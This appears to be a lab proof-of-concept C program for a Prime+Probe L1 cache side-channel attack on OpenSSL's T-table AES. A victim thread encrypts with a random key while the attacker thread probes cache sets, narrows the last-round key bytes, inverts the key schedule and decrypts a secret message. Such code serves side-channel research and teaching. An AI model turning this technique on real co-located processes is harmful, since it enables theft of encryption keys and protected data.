#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <semaphore.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>

#include "cache.h"
#include "set_sched.h"
#include "color.h"
#include "common.h"
#include "openssl/aes.h"


// Sched. policy
#define SCHED_POLICY SCHED_RR
// Max. realtime priority
#define PRIORITY 0

#define KEYSIZE 128
#define BLOCKSIZE 16
#define AES128_KEY_SIZE 16
#define AES_KEY_SCHEDULE_WORD_SIZE 4

#ifndef MACROS

#define TABLE0 0x000
#define TABLE1 0x400
#define TABLE2 0x800
#define TABLE3 0xc00
// Useful when not using PMC
#define THRESHOLD 200

#endif

static int alignment_dummy __attribute__ ((aligned(4096)));

static pthread_t thread;
static pid_t pid;

uint32_t Tes[1024][2];
uint32_t Taddr[4] = {TABLE0, TABLE1, TABLE2, TABLE3}; 
int probes[64] = {0};
int candidates[16][256];
int candidates_count[16] = {0};

unsigned char msg[16] = "TOP SECRET MSG!";
unsigned char sec[16] = {0};
unsigned char key[16] = {0}; // to be recovered

int eliminate(); // last round key elimination
int recover_master_key();
int calc_key();
int get_L1_set(uint32_t addr); // from address to l1 set
int get_setmap();

int victim();

int get_L1_set(uint32_t addr){
    return (addr >> 6) & 0x3F;
}

int eliminate(){
    static const int intmap[4] = {2, 3, 0, 1};
    int done_ret = 1, tmp;

    for(int set = 0; set < 64; ++set){
        //fprintf(stderr, "%d:%d ", set, probes[set]);
        // k2, k6, k10, k14 <- Te0[.] & 0x0000ff00
        // k3, k7, k11, k15 <- Te1[.] & 0x000000ff
        // k0, k4, k8, k12  <- Te2[.] & 0xff000000
        // k1, k5, k9, k13  <- Te3[.] & 0x00ff0000
        if(probes[set] == 0){
            for(int i = 0; i < 16; ++i){ // 16 entries
                for(int j = intmap[Tes[set*16+i][0]]; j < 16; j += 4){
                    tmp = (Tes[set*16+i][1] >> (24 - 8 * (j % 4)) & 0xff) ^ out[j];
                    //fprintf(stderr, "%d %d %d\t", tmp, i, j);
                    if(candidates[j][tmp] != 0) 
                        candidates_count[j] -= 1;
                    candidates[j][tmp] = 0;
                    
                }
            }
        }
    }
    for(int j = 0; j < 16; ++j){
		if(candidates_count[j] != 1){
			done_ret = 0;
            break;
		}
	}
    return done_ret;
}


int victim(){
    if ((pin_cpu(CPU1)) == -1) {
        fprintf(stderr, "[Victim] Couln't pin to CPU: %d\n", CPU1);
        return 1;
    }
    fprintf(stderr, "[Victim] RUNNING on core #%d\n", CPU1);
    uint8_t prvkey[16] = {0};
    AES_KEY rk;
    srand(time(NULL));
    for(int i = 0; i < 16; ++i){ // generate secret key
        prvkey[i] = rand() % 256;
    }
    AES_set_encrypt_key(prvkey, 128, &rk);
    /*
    fprintf(stderr, "[Victim]Key is:");
    for(int i= 0; i < 16; ++i){
        fprintf(stderr, "%02x", prvkey[i]);
    }
    fprintf(stderr, "\n");
    AES_set_encrypt_key(prvkey, 128, &rk);
    fprintf(stderr, "[Victim]10th round key is:");
    for(int i= 0; i < 4; ++i){
        fprintf(stderr, "%08x", rk.rd_key[40+i]);
    }
    fprintf(stderr, "\n");
    */
    while(p != TERMINATE){
        if(p == ENCRYPTION_BEGIN){
            AES_encrypt(in, out, &rk);
            p = ENCRYPTION_END; 
        }
    }
    return 0;
}


int calc_key(){
    for(int i = 0; i < 16; ++i){
        for(int j = 0; j < 256; ++j){
            if(candidates[i][j]){
                key[i] = j;
                break;
            }
        }
    }
}

static void aes128_key_schedule_inv_round(uint8_t rcon) {
	uint8_t round;
	uint8_t *s_key_0 = key + AES128_KEY_SIZE - AES_KEY_SCHEDULE_WORD_SIZE;
	uint8_t *s_key_m1 = s_key_0 - AES_KEY_SCHEDULE_WORD_SIZE;

	for (round = 1; round < AES128_KEY_SIZE / AES_KEY_SCHEDULE_WORD_SIZE; ++round) {
		/* XOR in previous word */
		s_key_0[0] ^= s_key_m1[0];
		s_key_0[1] ^= s_key_m1[1];
		s_key_0[2] ^= s_key_m1[2];
		s_key_0[3] ^= s_key_m1[3];

		s_key_0 = s_key_m1;
		s_key_m1 -= AES_KEY_SCHEDULE_WORD_SIZE;
	}

	/* Rotate previous word and apply S-box. Also XOR Rcon for first byte. */
	s_key_m1 = key + AES128_KEY_SIZE - AES_KEY_SCHEDULE_WORD_SIZE;
	s_key_0[0] ^= Te4_0[s_key_m1[1]] ^ rcon;
	s_key_0[1] ^= Te4_0[s_key_m1[2]];
	s_key_0[2] ^= Te4_0[s_key_m1[3]];
	s_key_0[3] ^= Te4_0[s_key_m1[0]];
}

static void calcBaseKey(void) {
	int round, byte;
	uint8_t rcon[] = {54, 27, 128, 64, 32, 16, 8, 4, 2, 1};
	for(round = 0; round < 10; round++) {
		aes128_key_schedule_inv_round(rcon[round]);
	}
}



int main(int argc, char* argv[]){
    int i, ret;
    char plain[BLOCKSIZE], cipher[BLOCKSIZE];
    p = ENCRYPTION_END;
    pthread_create(&thread, NULL, (void *(*) (void *))victim, NULL);
    const uint32_t *tables[4] = {Te0, Te1, Te2, Te3};
    for(i = 0; i < 4; ++i){
        for(int j = 0; j < 256; ++j){
            int tmp = ((Taddr[i] & 0xfff) / sizeof(uint32_t) + j) % 1024;
            Tes[tmp][1] = tables[i][j];
            Tes[tmp][0] = i;
        }
    }

    for(int k = 0; k < 16; k++){
        for(i = 0; i < 256; i++){
            candidates[k][i] = 1; // not eliminated
        }
        candidates_count[k] = 256;
    }
    if ((set_real_time_sched_priority(SCHED_POLICY, PRIORITY)) == -1) {
		fprintf(stderr, "[Attacker] Couln't set scheduling priority\n");
		return -1;
	}
    if ((pin_cpu(CPU0)) == -1) {
		fprintf(stderr, "[Attacker] Couln't pin to CPU: %d\n", CPU0);
		return 1;
	}
    fprintf(stderr, "[Attakcer] Running on core #%d\n", CPU0);
    
    p = ENCRYPTION_BEGIN;
    while(p != ENCRYPTION_END);
    strncpy(sec, out, 16); // prepare secret
    fprintf(stderr, "[Attakcer] Sent message:%s\n", in);
    fprintf(stderr, "[Attakcer] Received cipher:");
    for(i = 0; i < 16; ++i)
        fprintf(stderr, "%02hhx", sec[i]);
    fprintf(stderr, "\n");
    srand((unsigned) time(NULL));
    for(int r = 1;/*break inside*/ ; ++r){
        for(i = 0; i < BLOCKSIZE; ++i){
            in[i] = rand() % 256;
        }
        sched_yield();
        prime(0, 63); // Fill all L1 cache
        p = ENCRYPTION_BEGIN;
        // Encryption happpens here
        while(p != ENCRYPTION_END); //busy wait
        for(i = 0; i < 64; ++i){
            probes[i] = probe(i);
        }
        
        ret = eliminate();// ＥＬＩＭＩＮＡＴＥ　ＨＥＲＥ！

        fprintf(stderr, "[Attacker ROUND %d] Remaining key bytes:", r);
        for(i = 0; i < 16; i++) {
            fprintf(stderr, "%3d ", candidates_count[i]);
            fprintf(stdout, "%3d ", candidates_count[i]);
        }
        fprintf(stderr, "\r");
        fprintf(stdout, "\n");
        if(ret){
            fprintf(stderr, "\n");
            p = TERMINATE;
            calc_key();
            fprintf(stderr, "[Attacker] Recovered 10th round key is:");
            for(int i= 0; i < 16; ++i){
                fprintf(stderr, "%02x", key[i]);
            }
            fprintf(stderr, "\n");
            calcBaseKey();
            AES_KEY rk;
            AES_set_decrypt_key(key, KEYSIZE, &rk);
            AES_decrypt(sec, plain, &rk);
            fprintf(stderr, "[Attacker] Recovered key is:");
            for(int i= 0; i < 16; ++i){
                fprintf(stderr, "%02x", key[i]);
            }
            fprintf(stderr, "\n");
            fprintf(stderr, "[Attacker] Recovered message: %s\n", plain);
            if(strncmp(plain, msg, 16) == 0){
                fprintf(stderr, "[Attacker] Attack SUCCESS!");
            }else{
                fprintf(stderr, "[Attacker] Attack FAILURE!");
            }
           break;
        }
 
    }

    pthread_join(thread, NULL);
    return 0;

}